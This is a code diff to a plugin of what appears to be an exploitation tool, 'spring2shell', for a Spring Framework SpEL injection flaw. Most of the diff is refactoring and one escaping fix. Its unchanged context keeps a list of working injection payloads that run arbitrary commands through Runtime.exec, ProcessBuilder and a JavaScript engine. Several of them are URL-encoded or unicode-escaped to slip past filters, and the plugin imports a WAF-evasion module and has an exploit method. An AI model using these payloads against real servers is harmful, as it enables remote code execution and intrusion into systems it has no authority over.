@@ -5,13 +5,15 @@ Plugin for CVE-2025-55182: Spring Framework SpEL Injection.
 from __future__ import annotations
 
 import random
-from typing import Any
-import requests
+from typing import TYPE_CHECKING, Any
 
 from spring2shell.core.reporter import build_finding
 from spring2shell.evasion.waf_engine import waf_engine
 from spring2shell.plugins.base import BasePlugin
 from spring2shell.utils.auth import audit_log, rate_limit_acquire
+
+if TYPE_CHECKING:
+    import requests
 
 
 class CVE_2025_55182_Plugin(BasePlugin):
@@ -25,7 +27,7 @@ class CVE_2025_55182_Plugin(BasePlugin):
         '{"query":"{{#this.getClass().forName(\\"java.lang.Runtime\\").getMethod(\\"getRuntime\\").invoke(null).exec(\\"COMMAND\\")}}"}',
         '{"query":"{{new java.lang.ProcessBuilder(\\"COMMAND\\").start()}}"}',
         '{"query":"{{T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\").getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())}}"}',
-        '{"query":"{{#this.getClass().forName(\\"javax.script.ScriptEngineManager\\").newInstance().getEngineByName(\\"JavaScript\\").eval(\\\"java.lang.Runtime.getRuntime().exec(\\\\\\\\\\\\\\\"COMMAND\\\\\\\\\\\\\\\")\\\")}}"}',
+        '{"query":"{{#this.getClass().forName(\\"javax.script.ScriptEngineManager\\").newInstance().getEngineByName(\\"JavaScript\\").eval(\\"java.lang.Runtime.getRuntime().exec(\\\\\\\\\\\\\\"COMMAND\\\\\\\\\\\\\\")\\")}}"}',
         '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\")}}"}',
         '{"query": "%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22COMMAND%22%29%7D%7D"}',
         '{"qu\\u0065ry": "{{T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\")}}"}',
@@ -81,10 +83,12 @@ class CVE_2025_55182_Plugin(BasePlugin):
         headers: dict[str, str],
     ) -> dict[str, Any] | None:
         import aiohttp
+
         if not isinstance(session, aiohttp.ClientSession):
             return await super().async_check(session, target, endpoint, headers)
 
         import random
+
         from spring2shell.utils.async_network import send_async_request
         from spring2shell.utils.auth import audit_log
 
@@ -125,7 +129,6 @@ class CVE_2025_55182_Plugin(BasePlugin):
                 except Exception:
                     continue
         return None
-
 
     def exploit(
         self,
